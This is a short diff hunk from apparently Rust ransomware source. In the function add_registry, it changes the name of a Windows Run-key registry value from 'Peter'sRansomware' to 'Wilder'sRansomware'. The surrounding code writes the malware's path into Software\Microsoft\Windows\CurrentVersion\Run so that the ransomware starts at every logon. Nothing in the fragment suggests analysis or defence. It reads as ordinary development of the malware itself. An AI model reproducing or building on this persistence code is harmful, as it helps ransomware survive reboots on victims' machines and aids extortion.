@@ -81,7 +81,7 @@ fn add_registry() -> bool {
             CString::new("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
                 .unwrap()
                 .as_ptr(),
-            CString::new("Peter'sRansomware").unwrap().as_ptr(),
+            CString::new("Wilder'sRansomware").unwrap().as_ptr(),
             2,
             &mut reg_type,
             path.as_ptr() as *const _ as *mut _,
